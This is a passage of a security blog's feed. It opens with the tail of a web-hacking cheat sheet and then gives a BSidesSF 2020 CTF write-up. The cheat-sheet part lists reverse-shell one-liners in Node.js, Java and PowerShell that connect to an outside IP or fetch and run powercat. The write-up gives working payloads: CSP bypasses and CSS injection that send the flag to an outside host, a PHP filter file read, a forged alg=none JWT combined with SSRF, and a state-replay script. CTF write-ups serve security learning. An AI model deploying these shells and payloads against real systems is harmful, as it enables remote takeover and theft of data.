class="string">&quot;15.165.0.114&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;client.<span class="title function_">pipe</span>(sh.<span class="property">stdin</span>);sh.<span class="property">stdout</span>.<span class="title function_">pipe</span>(client); sh.<span class="property">stderr</span>.<span class="title function_">pipe</span>(client);&#125;);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/15.165.0.114/8888 0&gt;&amp;1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.getRuntime();<span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> r.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/15.165.0.114/5278;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;);p.waitFor();</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">IEX</span> (<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>);powercat <span class="literal">-c</span> <span class="number">15.165</span>.<span class="number">0.114</span> <span class="literal">-p</span> <span class="number">8888</span> <span class="literal">-e</span> cmd</span><br></pre></td></tr></table></figure></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;This document is continuously updated.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;cross-site-scripting&quot;&gt;&lt;a href=&quot;#cross-site-scripting&quot; class
      
    
    </summary>
    
    
      <category term="Docs" scheme="https://blog.p6.is/category/docs/"/>
    
    
      <category term="CheatSheet" scheme="https://blog.p6.is/tags/CheatSheet/"/>
    
  </entry>
  
  <entry>
    <title>BSidesSF 2020 CTF</title>
    <link href="https://blog.p6.is/BSidesSF-2020-CTF/"/>
    <id>https://blog.p6.is/BSidesSF-2020-CTF/</id>
    <published>2020-02-25T22:48:52.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/977">https://ctftime.org/event/977</a></li></ul><h2 id="376pts-cards"><a href="#376pts-cards" class="headerlink" title="[376pts] cards"></a>[376pts] cards</h2><blockquote><p>San Francisco has the occasional underground card room. Can you run the table in this game?</p><p><a href="https://cards-d38741c8.challenges.bsidessf.net/">https://cards-d38741c8.challenges.bsidessf.net</a></p></blockquote><p><img src="/img/2020/02/image-20200225211525791.png" alt="image-20200225211525791"></p><p>In the challenge site, you can play <a href="https://en.wikipedia.org/wiki/Blackjack">Blackjack</a>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://cards-d38741c8.challenges.bsidessf.net/api/config</span></span><br><span class="line">&#123;<span class="string">&quot;Goal&quot;</span>:<span class="number">100000</span>,<span class="string">&quot;MinBet&quot;</span>:<span class="number">10</span>,<span class="string">&quot;MaxBet&quot;</span>:<span class="number">500</span>,<span class="string">&quot;GameHandler&quot;</span>:<span class="string">&quot;/game.go&quot;</span>,<span class="string">&quot;DeckHandler&quot;</span>:<span class="string">&quot;/deck.go&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>Users are given <code>$1000</code> initial balance. and from <code>/api/config</code>, you can get the flag when achieve <code>$100000</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://cards-d38741c8.challenges.bsidessf.net/api</span></span><br><span class="line">&#123;<span class="string">&quot;SecretState&quot;</span>:<span class="string">&quot;2fd8d83c ... 54e39799&quot;</span>,<span class="string">&quot;PlayerHand&quot;</span>:[],<span class="string">&quot;DealerHand&quot;</span>:[],<span class="string">&quot;Balance&quot;</span>:<span class="number">1000</span>,<span class="string">&quot;GameState&quot;</span>:<span class="string">&quot;Idle&quot;</span>,<span class="string">&quot;SessionState&quot;</span>:<span class="string">&quot;Playing&quot;</span>,<span class="string">&quot;Bet&quot;</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><p>In <code>/api</code>, the <code>SecretState</code> property has a hex byte in the form of json, which contains the value of the user’s balance with encryption.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://cards-d38741c8.challenges.bsidessf.net/api/deal</span></span><br><span class="line">&#123;<span class="string">&quot;SecretState&quot;</span>:<span class="string">&quot;e2ad07a3 ... d62c519d&quot;</span>,<span class="string">&quot;PlayerHand&quot;</span>:[[<span class="string">&quot;7&quot;</span>,<span class="string">&quot;Clubs&quot;</span>],[<span class="string">&quot;Queen&quot;</span>,<span class="string">&quot;Clubs&quot;</span>]],<span class="string">&quot;DealerHand&quot;</span>:[[<span class="string">&quot;X&quot;</span>,<span class="string">&quot;X&quot;</span>],[<span class="string">&quot;6&quot;</span>,<span class="string">&quot;Spades&quot;</span>]],<span class="string">&quot;Balance&quot;</span>:<span class="number">990</span>,<span class="string">&quot;GameState&quot;</span>:<span class="string">&quot;Playing&quot;</span>,<span class="string">&quot;SessionState&quot;</span>:<span class="string">&quot;Playing&quot;</span>,<span class="string">&quot;Bet&quot;</span>:<span class="number">10</span>&#125;</span><br></pre></td></tr></table></figure><p>If you send a request to <code>/api/deal</code> with the initial <code>SecretState</code> value, the cards of the player and dealer have randomly chosen. Sometimes the player’s card make BlackJack, and in that case, the game is over and the Balance goes up instantly.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Win or Lose?</span></span><br><span class="line">&#123;<span class="string">&quot;SecretState&quot;</span>:<span class="string">&quot;d113e3fb ... b86484c1&quot;</span>,<span class="string">&quot;PlayerHand&quot;</span>:[[<span class="string">&quot;7&quot;</span>,<span class="string">&quot;Clubs&quot;</span>],[<span class="string">&quot;Queen&quot;</span>,<span class="string">&quot;Clubs&quot;</span>]],<span class="string">&quot;DealerHand&quot;</span>:[[<span class="string">&quot;X&quot;</span>,<span class="string">&quot;X&quot;</span>],[<span class="string">&quot;6&quot;</span>,<span class="string">&quot;Spades&quot;</span>]],<span class="string">&quot;Balance&quot;</span>:<span class="number">500</span>,<span class="string">&quot;GameState&quot;</span>:<span class="string">&quot;Playing&quot;</span>,<span class="string">&quot;SessionState&quot;</span>:<span class="string">&quot;Playing&quot;</span>,<span class="string">&quot;Bet&quot;</span>:<span class="number">500</span>&#125;</span><br><span class="line"><span class="comment">// Blackjack!</span></span><br><span class="line">&#123;<span class="string">&#x27;SecretState&#x27;</span>: <span class="string">&#x27;d113e3fb ... b86484c1&#x27;</span>, <span class="string">&#x27;PlayerHand&#x27;</span>: [[<span class="string">&#x27;Jack&#x27;</span>, <span class="string">&#x27;Spades&#x27;</span>], [<span class="string">&#x27;Ace&#x27;</span>, <span class="string">&#x27;Spades&#x27;</span>]], <span class="string">&#x27;DealerHand&#x27;</span>: [[<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;Hearts&#x27;</span>], [<span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;Clubs&#x27;</span>]], <span class="string">&#x27;Balance&#x27;</span>: <span class="number">1750</span>, <span class="string">&#x27;GameState&#x27;</span>: <span class="string">&#x27;Blackjack&#x27;</span>, <span class="string">&#x27;SessionState&#x27;</span>: <span class="string">&#x27;Playing&#x27;</span>, <span class="string">&#x27;Bet&#x27;</span>: <span class="number">500</span>&#125;</span><br></pre></td></tr></table></figure><p>The point is that if you lose or lose, the SecretState doesn’t destroy the value, so if you keep making deals until the Black Jack comes out, it’s possible to increase Balance continuously.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">state = requests.post(<span class="string">&#x27;https://cards-d38741c8.challenges.bsidessf.net/api&#x27;</span>).json()[<span class="string">&#x27;SecretState&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res = requests.post(<span class="string">&#x27;https://cards-d38741c8.challenges.bsidessf.net/api/deal&#x27;</span>, json = &#123;<span class="string">&#x27;Bet&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;SecretState&#x27;</span>: state&#125;).json()</span><br><span class="line">    <span class="keyword">if</span> res[<span class="string">&#x27;GameState&#x27;</span>] == <span class="string">&#x27;Blackjack&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        state = res[<span class="string">&#x27;SecretState&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Flag&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="built_in">print</span>(res[<span class="string">&#x27;Flag&#x27;</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>This script implements the description.</p><p><img src="/img/2020/02/image-20200225214251382.png" alt="image-20200225214251382"></p><h2 id="51pts-csp-1"><a href="#51pts-csp-1" class="headerlink" title="[51pts] csp-1"></a>[51pts] csp-1</h2><blockquote><p>Can you bypass the CSP to steal the flag?</p><p><a href="https://csp-1-5aa1f221.challenges.bsidessf.net/">https://csp-1-5aa1f221.challenges.bsidessf.net</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;self&#x27; data:; default-src &#x27;self&#x27;; connect-src *; report-uri /csp_report</span><br></pre></td></tr></table></figure><p>Basic CSP bypass challenge. There is no filtering policy in script insertion, and Incredibly, the <code>script-src</code> policy authorizes data schema, making CSP meaningless.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:,fetch(&#x27;/csp-one-flag&#x27;).then(x=&gt;x.text()).then(x=&gt;location=&#x27;http://rwx.kr/?&#x27;+escape(x))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/2020/02/image-20200225214623280.png" alt="image-20200225214623280"></p><h2 id="51pts-csp-2"><a href="#51pts-csp-2" class="headerlink" title="[51pts] csp-2"></a>[51pts] csp-2</h2><blockquote><p>Can you bypass the CSP to steal the flag?</p><p><a href="https://csp-2-2446d5a3.challenges.bsidessf.net/">https://csp-2-2446d5a3.challenges.bsidessf.net</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#x27;self&#x27; ajax.googleapis.com &#x27;unsafe-eval&#x27;; default-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;; connect-src *; report-uri /csp_report</span><br></pre></td></tr></table></figure><p>It’s similar to previous one. <code>script-src</code> allows embeding <code>ajax.googleapis.com</code> . The <code>ajax.googleapis.com</code> contains an <code>Angularjs</code> script, so you can bypass the <code>CSP</code> using the <code>Angularjs Template</code>.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span> <span class="attr">ng-csp</span>&gt;</span></span><br><span class="line">&#123;&#123;constructor.constructor(&#x27;eval(atob(&quot;ZmV0Y2goIi9jc3AtdHdvLWZsYWciKS50aGVuKHg9PngudGV4dCgpKS50aGVuKHg9PmxvY2F0aW9uPSIvL3J3eC5rci8/Iitlc2NhcGUoeCkp&quot;))&#x27;)()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/2020/02/image-20200225215149637.png" alt="image-20200225215149637"></p><h2 id="87pts-fun-with-flags"><a href="#87pts-fun-with-flags" class="headerlink" title="[87pts] fun with flags"></a>[87pts] fun with flags</h2><blockquote><p>The admin, Sheldon has the challenge flag, can you steal it?</p><p><a href="https://fun-with-flags-3b5279f5.challenges.bsidessf.net/">https://fun-with-flags-3b5279f5.challenges.bsidessf.net</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">value</span>=<span class="string">Try</span> <span class="attr">reading</span> <span class="attr">this</span> <span class="attr">value</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CSS Injection challenge has message sending function to admin.<br>all of other tags are filtered, but because of <code>&lt;style&gt;</code> tags are allowed, you can use the payload generator below to get the value of the input tag with the name property flag.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/css; charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$ascii</span> = <span class="number">20</span>; <span class="variable">$ascii</span> &lt; <span class="number">128</span>; <span class="variable">$ascii</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$ascii</span> == <span class="number">92</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;input[name=flag][value^=&quot;&#x27;</span>.<span class="variable">$a</span>.<span class="title function_ invoke__">htmlentities</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$ascii</span>)).<span class="string">&#x27;&quot;] &#123;</span></span><br><span class="line"><span class="string">                background-image: url(&quot;http://rwx.kr/?FOUND=&#x27;</span>.<span class="variable">$a</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$ascii</span>)).<span class="string">&#x27;&quot;);</span></span><br><span class="line"><span class="string">        &#125;&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;let_the_shellz_rise_b4_baking&#125;</span><br></pre></td></tr></table></figure><p>It is convenient to write an attack in Python script. But I sent them one by one because it was hassle.</p><h2 id="51pts-had-a-bad-day"><a href="#51pts-had-a-bad-day" class="headerlink" title="[51pts] had a bad day"></a>[51pts] had a bad day</h2><blockquote><p>Can you read flag.php?</p><p><a href="https://had-a-bad-day-5b3328ad.challenges.bsidessf.net/">https://had-a-bad-day-5b3328ad.challenges.bsidessf.net</a></p></blockquote><p><img src="/img/2020/02/image-20200225220005141.png" alt="image-20200225220005141"></p><p>There’s two buttons. If click on them, forwarded to <code>/index.php?category=woofers</code> and <code>/index.php?category=woofers</code> each. Since <code>woofer.php</code> shows the same of <code>index.php?category=/woofers.php</code>, we can expect scripts like <code>include($_GET[&#39;category&#39;] + &#39;.php&#39;)</code> to be within <code>index.php</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from index.php?category=php://filter/convert.base64-encode/resource=index</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>You can get the source of <code>index.php</code> using php wrapper.<br>If the <code>index</code> string is included in the parameter, filtering is likely to be bypassed.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php?category=php://filter/convert.base64-encode/resource=index/../flag</span></span><br><span class="line">PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIENURntoYXBwaW5lc3NfbmVlZHNfbm9fZmlsdGVyc30KPz4=</span><br><span class="line"></span><br><span class="line"><span class="comment">// decoded</span></span><br><span class="line">&lt;!-- Can you read this flag? --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// CTF&#123;happiness_needs_no_filters&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="157pts-recipes"><a href="#157pts-recipes" class="headerlink" title="[157pts] recipes"></a>[157pts] recipes</h2><blockquote><p>I’ve found this recipe storage service. Rumor has it that the famous San Francisco-based Boudin Bakery is working on a new recipe. Can you get that for me?</p><p><a href="https://recipes-0abb43f9.challenges.bsidessf.net/">https://recipes-0abb43f9.challenges.bsidessf.net</a></p></blockquote><p>The points of this problem are <code>JWT authentication bypass</code> and <code>SSRF</code>.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/recipes&quot;</span>&gt;</span>Recipes<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/logout&quot;</span>&gt;</span>Logout<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;nav-item d-none&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;nav-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/users&quot;</span>&gt;</span>Users<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Not visible on rendered screen, but you can find <code>/users</code> route from html source.</p><p><img src="/img/2020/02/image-20200225221039313.png" alt="image-20200225221039313"></p><p>If you try to connect, you’ll be given a hint that you can only connect to the local host.</p><p><img src="/img/2020/02/image-20200225221221820.png" alt="image-20200225221221820"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>users<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;recipe-body&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>By posix<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;data:application/octet-stream;base64,CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI<span class="symbol">&amp;#43;</span>Cgo8aGVhZD4KCiAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW ... &quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>In recipe creation feature, If you submit with a local host address to <code>Picture URL</code>, you can get the contents of the base64 encoded <code>/users</code> page on the entry of the image address.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;/profile/6180f0c8-778b-442f-a5ab-10e18bef4c2d&#x27;</span>&gt;</span>boudin_bakery<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>If you decode the contents, you can find the uuid of the <code>boudin_bakery</code> account.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jwt</span></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<span class="property">eyJleHAiOjE1ODI2Mzk5NzIsImlhdCI6MTU4MjYzNjM3MiwiaXNzIjoicmVjaXBlYm90IiwibmJmIjoxNTgyNjM2MzcyLCJzdWIiOiIyYzc4ZDJmNy03OGRlLTQwYzEtODFjNi1lYTJlOTc3MDQ2YWUifQ</span>.<span class="property">jgTO8jUAOGFi_vmyGhs90aM0PVWU6f8NG5zSRdb8zhw</span></span><br><span class="line"><span class="comment">// decoded</span></span><br><span class="line">header : &#123;<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;HS256&quot;</span>,<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>&#125;</span><br><span class="line">content : &#123;<span class="string">&quot;exp&quot;</span>:<span class="number">1582639972</span>,<span class="string">&quot;iat&quot;</span>:<span class="number">1582636372</span>,<span class="string">&quot;iss&quot;</span>:<span class="string">&quot;recipebot&quot;</span>,<span class="string">&quot;nbf&quot;</span>:<span class="number">1582636372</span>,<span class="string">&quot;sub&quot;</span>:<span class="string">&quot;2c78d2f7-78de-40c1-81c6-ea2e977046ae&quot;</span>&#125;</span><br><span class="line">signature : <span class="language-xml"><span class="tag">&lt;<span class="name">binary</span> <span class="attr">data</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>The JWT stores in cookies contains user’s uuid value.<br>You can change the sub value to a uuid of <code>boudin_bakery</code> account’s using <code>jwt none type input</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// plain</span></span><br><span class="line">header : &#123;<span class="string">&quot;alg&quot;</span>:<span class="string">&quot;none&quot;</span>,<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>&#125;</span><br><span class="line">content : &#123;<span class="string">&quot;exp&quot;</span>:<span class="number">1582639972</span>,<span class="string">&quot;iat&quot;</span>:<span class="number">1582636372</span>,<span class="string">&quot;iss&quot;</span>:<span class="string">&quot;recipebot&quot;</span>,<span class="string">&quot;nbf&quot;</span>:<span class="number">1582636372</span>,<span class="string">&quot;sub&quot;</span>:<span class="string">&quot;6180f0c8-778b-442f-a5ab-10e18bef4c2d&quot;</span>&#125;</span><br><span class="line">signature : <span class="language-xml"><span class="tag">&lt;<span class="name">binary</span> <span class="attr">data</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">// built jwt</span></span><br><span class="line"><span class="language-xml">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJleHAiOjE1ODI2Mzk5NzIsImlhdCI6MTU4MjYzNjM3MiwiaXNzIjoicmVjaXBlYm90IiwibmJmIjoxNTgyNjM2MzcyLCJzdWIiOiI2MTgwZjBjOC03NzhiLTQ0MmYtYTVhYi0xMGUxOGJlZjRjMmQifQ.</span></span><br></pre></td></tr></table></figure><p>If you complete jwt in the above way and try connecting, you can see the flag in the <code>Flag Bread</code> item.</p><p><img src="/img/2020/02/image-20200225222113311.png" alt="image-20200225222113311"></p><h2 id="51pts-simple-todos"><a href="#51pts-simple-todos" class="headerlink" title="[51pts] simple todos"></a>[51pts] simple todos</h2><blockquote><p>For my new job as a San Franisco tour guide, I totally realized that I can use the Meteor <a href="https://www.meteor.com/tutorials/blaze/creating-an-app">simple-todos tutorial</a>! It was really easy, the app works perfectly by step 9 of the tutorial, you don’t even need to write your own ‘publish and subscribe’ code! It’s all done for you!</p><p><a href="https://simple-todos-6c7bf285.challenges.bsidessf.net/">https://simple-todos-6c7bf285.challenges.bsidessf.net</a></p></blockquote><p>This is the challenge about Information Disclosure using WebSocket. The private message does not appear on the screen, but it sends it to the client without any special permission settings. This allows you to view a private message simply by checking the web socket communications history.</p><p><img src="/img/2020/02/image-20200225222310259.png" alt="image-20200225222310259"></p><p><img src="/img/2020/02/image-20200225222317282.png" alt="image-20200225222317282"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ctftime.org/event/977&quot;&gt;https://ctftime.org/event/977&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;376pts-cards&quot;&gt;&lt;a href=&quot;#376pts-cards&quot; 
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://blog.p6.is/category/writeup/"/>
    
    
      <category term="BSidesSF CTF" scheme="https://blog.p6.is/tags/BSidesSF-CTF/"/>
    
  </entry>
  
  <entry>
    <title>How Pragyan CTF 2020 hacked</title>
    <link href="https://blog.p6.is/how-pragyan-ctf-2020-hacked/"/>
    <id>https://blog.p6.is/how-pragyan-ctf-2020-hacked/</id>
    <published>2020-02-23T01:00:47.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
